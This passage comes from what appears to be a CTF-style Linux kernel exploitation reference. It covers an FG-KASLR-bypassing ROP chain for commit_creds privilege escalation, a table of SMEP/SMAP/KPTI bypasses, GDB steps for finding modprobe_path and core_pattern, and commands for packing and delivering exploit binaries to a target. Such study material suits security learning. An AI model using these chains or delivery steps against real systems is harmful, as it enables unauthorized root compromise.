unsigned long ksymtab_prepare_kernel_cred = 0xffffffff81f8d4fc; // from /proc/kallsyms
unsigned long ksymtab_commit_creds = 0xffffffff81f87d90;

// ROP chain to read ksymtab entry and compute real address:
// 1. Load ksymtab address into rax
payload[off++] = pop_rax_ret + kaslr_offset;
payload[off++] = ksymtab_prepare_kernel_cred + kaslr_offset;
// 2. Read 4-byte relative offset: mov eax, [rax]
payload[off++] = mov_eax_deref_rax_pop1_ret + kaslr_offset;
payload[off++] = 0x0;
// 3. Return to userland to compute: real_addr = ksymtab_addr + kaslr_offset + offset
payload[off++] = kpti_trampoline + kaslr_offset + 22;
payload[off++] = 0; payload[off++] = 0;
payload[off++] = (unsigned long)resolve_and_continue;
// ...

void resolve_and_continue() {
    // eax contains the relative offset read from ksymtab
    unsigned long resolved = ksymtab_prepare_kernel_cred + kaslr_offset + fetched_offset;
    // Now use resolved address in next ROP stage
}
```

**Key insight:** FG-KASLR requires a multi-stage exploit: first return to userland to compute resolved addresses from `__ksymtab` offsets, then re-enter the kernel with a second ROP chain using the resolved function addresses.

---

## KPTI / SMEP / SMAP Quick Reference

| Protection | Blocks | Bypass |
|-----------|--------|--------|
| SMEP | Executing userland pages from kernel | kROP (kernel ROP chain) — see [Kernel ROP](#kernel-rop-with-prepare_kernel_cred--commit_creds) |
| SMAP | Accessing userland memory from kernel | kROP with heap-resident chain, `stac`/`clac` gadgets |
| No SMEP/SMAP | (nothing) | [ret2usr](#ret2usr-no-smepsmap) — directly call userland privesc function |
| KPTI | Kernel page table isolation | [Trampoline](#method-1-swapgs_restore-trampoline), [signal handler](#method-2-signal-handler-sigsegv), [modprobe_path](#method-3-modprobe_path-via-rop), [core_pattern](#method-4-core_pattern-via-rop) |

**Direct CR4 modification (old kernels):** Write to CR4 to clear SMEP/SMAP bits. Blocked on modern kernels by `native_write_cr4()` pinning.

See [KPTI Bypass Methods](#kpti-bypass-methods) for detailed bypass techniques with code.

---

## Finding Symbol Offsets Without CONFIG_KALLSYMS_ALL

`/proc/kallsyms` only shows `.text` symbols by default. Data symbols like `modprobe_path` and `core_pattern` require `CONFIG_KALLSYMS_ALL=y`.

**Finding modprobe_path:**

```bash
# 1. Get call_usermodehelper_setup address (always in /proc/kallsyms)
cat /proc/kallsyms | grep call_usermodehelper_setup

# 2. In GDB, set breakpoint and trigger
hb *0xffffffff810c8c80
# Trigger: echo -ne '\xff\xff\xff\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x

# 3. Check first argument (RDI = modprobe_path)
(gdb) p/x $rdi
# 0xffffffff8265ff00
(gdb) x/s $rdi
# "/sbin/modprobe"
```

**Finding core_pattern:**

```bash
# 1. Set breakpoint on override_creds (called by do_coredump)
# 2. Crash a process: gcc -static -o crash -xc - <<< 'int main(){((void(*)())0)();}'
# 3. After override_creds returns, disassemble — look for data address in movzx
```

---

## Exploit Delivery

Kernel exploits are typically large static binaries. Minimize size for remote delivery:

```bash
# 1. Compile with musl-libc (much smaller than glibc)
musl-gcc -static -O2 -o exploit exploit.c

# 2. Strip symbols
strip exploit

# 3. Compress and encode for transfer
gzip exploit && base64 exploit.gz > exploit.b64

# 4. On target: decode and decompress
base64 -d exploit.b64 | gunzip > /tmp/exploit && chmod +x /tmp/exploit

# Optional: UPX compression (further reduces size)
upx --best exploit
```

**Common pitfall:** If the exploit uses `setxattr()` with a file path, ensure the file exists in the remote environment. Local path (`/tmp/exploit`) may differ from remote path (`/home/user/exploit`).
